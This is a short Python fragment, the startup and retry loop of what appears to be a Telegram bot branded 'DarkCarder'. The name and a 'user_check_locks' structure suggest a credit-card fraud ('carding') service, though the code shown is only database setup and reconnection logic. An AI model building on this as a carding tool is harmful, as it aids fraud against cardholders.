# MAIN
# ============================================================
if __name__ == "__main__":
    user_check_locks.clear()
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()
    print(f"🔥 {BOT_NAME} LIVE — Admin Panel + DarkCarder Brand")
    retry_count = 0
    while retry_count < 9999:
        try:
            bot.start()
            bot.run_until_disconnected()
            break
        except KeyboardInterrupt:
            print("🛑 Stopped")
            break
        except Exception as e:
            retry_count += 1
            print(f"💥 {e}")
            time.sleep(10 if "FloodWait" not in str(e) else 30)
